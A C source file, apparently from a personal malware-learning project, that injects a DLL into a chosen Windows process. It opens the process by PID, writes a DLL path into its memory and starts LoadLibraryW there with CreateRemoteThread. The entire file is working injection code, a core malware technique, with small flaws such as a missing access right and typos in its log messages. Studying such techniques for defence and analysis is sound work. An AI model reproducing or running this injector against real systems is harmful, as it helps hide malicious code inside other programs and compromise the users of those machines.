#include <stdio.h>
#include <windows.h>
#include <stdlib.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)

int main(int argc, char* argv[]){

    DWORD TID = 0;
    DWORD PID = 0;
    LPVOID rBuffer = NULL;
    HANDLE hThread = NULL;
    HANDLE hProcess = NULL;
    HMODULE hKernel32 = NULL;
    wchar_t dllPath[MAX_PATH] = L"C:\\Users\\main\\Documents\\malware-creation-and-analysis\\dll-injection-attach-process\\process.dll";
    size_t pathSize = sizeof(dllPath);
    size_t bytesWritten = 0;

    if (argc < 2){
        warn("usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    info("trying to get a handle to the process (%ld)", PID);
    hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE), FALSE, PID);
    if(hProcess == NULL){
        warn("could not get a handle to the process, error: %0x%lx", GetLastError());
        return EXIT_FAILURE;
    }
    okay("got handle to process (%ld)", PID);
    info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);

    info("getting handle to Kernel32.dll");
    hKernel32 = GetModuleHandleW(L"kernel32");

    if(hKernel32 == NULL){
        warn("could not get handle to Kernel32.dll, error: 0x%lx", GetLastError());
        return EXIT_FAILURE;
    }

    okay("got handle to KernAl32.dll");
    info("\\___[ hKernal\n\t\\_0x%p]\n", hKernel32);

    info("getting address of LoadLibrary()");
    LPTHREAD_START_ROUTINE mainLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    okay("got address of LoadLibraryW()");
	info("\\___[ LoadLibraryW\n\t\\_0x%p]\n", mainLoadLibrary);

    info("allocating memory in target process");
    rBuffer = VirtualAllocEx(hProcess, NULL, pathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if(rBuffer == NULL){
        warn("could not get allocate buffer to target process memory, error: 0x%lx", GetLastError());
        goto CLEANUP;
    }

    info("writing to allocated buffer");
	WriteProcessMemory(hProcess, rBuffer, dllPath, pathSize, &bytesWritten);
	okay("wrote %zu-bytes to the process memory", bytesWritten);

    info("creating a thread");
	hThread = CreateRemoteThread(hProcess, NULL, 0, mainLoadLibrary, rBuffer, 0, &TID);

	if (hThread == NULL) {
		warn("unable to create thread, error: 0x%lx", GetLastError());
		goto CLEANUP;
	}

	okay("created a new thread in the target process! (%ld)", TID);
	info("\\___[ hThread\n\t\\_0x%p]\n", hThread);

	/*------[CLEANLY EXIT]------*/
	info("waiting for thread to finish");
	WaitForSingleObject(hThread, INFINITE);
	okay("thread finished execution");
	goto CLEANUP;

    CLEANUP:

	if (hThread) {
		info("closing handle to thread");
		CloseHandle(hThread);
	}

	if (hProcess) {
		info("closing handle to process");
		CloseHandle(hProcess);
	}

	okay("finished with house keeping, see you next time!");
	return EXIT_SUCCESS;

}
